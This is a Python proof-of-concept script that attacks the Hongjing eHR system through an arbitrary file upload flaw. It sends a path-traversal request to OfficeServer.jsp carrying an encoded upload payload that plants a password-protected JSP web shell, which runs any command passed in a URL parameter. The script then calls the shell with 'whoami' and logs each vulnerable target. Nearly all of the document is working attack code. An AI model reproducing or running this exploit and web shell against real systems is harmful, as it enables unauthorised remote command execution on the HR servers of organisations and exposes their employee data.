import requests
import time
import buter
import wirtefile

filename = "./reps/宏景eHR任意文件上传-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate"
    }
poc = "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
data = '''DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nFILETYPE=Li5ccUJGVS5qc3A=\r\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\r\n<% if("123".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>'''

def hjfileup(url):
    try:
        rep = requests.post(url=url,headers=headers,data=data,verify=False,timeout=30)
        paths = '/qBFU.jsp?pwd=123&cmd=whoami'
        reps = requests.get(url=url+paths,headers=headers,verify=False,timeout=10)
        if reps.status_code == 200:
                print(buter.colors.GREEN+  f"疑似存在宏景eHR任意文件上传 请进一步验证 url : {url}" + buter.colors.END)
                reptext = reps.text
                print(buter.colors.GREEN+ reptext+ buter.colors.END)
                output = f"{url}\n{reptext}"
                wirtefile.writefiles(filename,output)
        else:
            print(buter.colors.RED+ f"未发现宏景eHR任意文件上传 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
